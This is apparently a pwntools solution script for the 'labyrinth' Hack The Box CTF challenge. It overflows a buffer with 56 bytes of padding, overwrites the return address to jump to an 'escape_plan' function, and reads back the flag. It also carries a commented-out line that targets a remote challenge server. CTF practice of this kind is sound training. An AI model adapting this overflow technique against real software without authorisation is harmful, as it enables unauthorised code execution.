from pwn import *

offset = 'A'*56

e = ELF('./labyrinth')

RIP = p64(e.sym['escape_plan'] + 1)

payload = offset.encode() + RIP

binary = process('./labyrinth')
#binary = remote('165.232.108.249',32721)

#print(payload)
binary.sendline(b'69')
binary.sendline(payload)
success(f'Flag --> {binary.recvline_contains(b"HTB").strip().decode()}')
